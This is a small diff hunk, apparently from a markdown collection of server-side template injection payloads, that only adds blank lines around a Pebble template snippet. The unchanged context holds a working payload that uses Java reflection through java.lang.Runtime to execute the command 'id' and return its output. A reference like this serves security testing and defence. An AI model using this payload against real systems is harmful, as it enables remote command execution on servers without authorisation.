@@ -194,6 +194,7 @@ Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.
 New version of Pebble :
 
 ```java
+
 {% set cmd = 'id' %}
 {% set bytes = (1).TYPE
      .forName('java.lang.Runtime')
@@ -206,6 +207,7 @@ New version of Pebble :
      .forName('java.lang.String')
      .constructors[0]
      .newInstance(([bytes]).toArray()) }}
+
 ```
 
 ---
